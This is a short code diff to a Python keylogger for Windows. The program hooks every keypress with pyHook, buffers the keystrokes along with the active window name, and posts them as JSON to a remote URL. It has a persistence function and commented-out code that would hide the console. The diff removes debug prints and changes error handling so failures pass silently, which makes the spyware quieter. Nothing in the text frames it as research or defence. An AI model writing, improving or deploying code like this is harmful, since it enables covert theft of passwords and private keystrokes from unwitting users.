@@ -91,9 +91,9 @@ class EventHandler(threading.Thread):
 		try:
 			response = session.post(url=url, data=json.dumps(payload, ensure_ascii=False),
 						headers={'Content-Type': 'application/json'}, verify=True)
-			print(response.status_code)
-		except Exception as e:
-			print(e)
+			# print(response.status_code)
+		except:
+			pass
 
 def on_keyboard(event):
 	'''function that is executed every time the KeyDown event is detected'''
@@ -110,7 +110,6 @@ def on_keyboard(event):
 			key_pressed = chr(event.Ascii)
 		# add key stroke to buffer DATA
 		DATA += key_pressed
-		print(DATA)
 		if len(DATA) >= DATA_LENGTH:
 			# if buffer DATA is full, log the buffer
 			BUFFER.put((DATA, event.WindowName))
@@ -137,7 +136,6 @@ def persist():
 if __name__ == '__main__':
 	eh = EventHandler(MODE, BUFFER)
 	eh.start()
-	print('eh started')
 	# hide the console
 	# window = win32console.GetConsoleWindow()
 	# win32gui.ShowWindow(window, 0)
@@ -146,6 +144,5 @@ if __name__ == '__main__':
 	hm = pyHook.HookManager()
 	hm.SubscribeKeyDown(on_keyboard)
 	hm.HookKeyboard()
-	print('hooked')
 	# infinite loop
 	pythoncom.PumpMessages()
